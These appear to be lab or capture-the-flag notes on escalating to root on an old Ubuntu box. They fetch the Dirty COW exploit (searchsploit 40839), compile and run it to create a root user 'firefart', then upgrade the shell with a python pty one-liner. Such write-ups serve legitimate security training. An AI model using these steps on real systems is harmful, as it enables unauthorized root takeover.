System info:
```bash
uname -a
Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

Tmp folder contains an executable *RXgtm*:
![[Pasted image 20240421121033.png]]
=> nay

User sumo has sudo privs:
![[Pasted image 20240421134854.png]]

Linpeas shows that system might be vulnerable to dirty cow exploit.
Download exploit:
```bash
searchsploit -m 40839
```

Upload the exploit to the machine and compile it:
```bash
gcc -pthread 40839.c -o dirty -lcrypt
```
Error:
```bash
gcc: error trying to exec 'cc1': execvp: No such file or directory
```
Fix:
```bash
export PATH="$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8/"
```

Run the exploit:
![[Pasted image 20240421140056.png]]

It created a new root user "firefart" with our supplied password "sumo":
![[Pasted image 20240421140150.png]]

If you cant `su` upgrade the shell, run the below command and try again:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
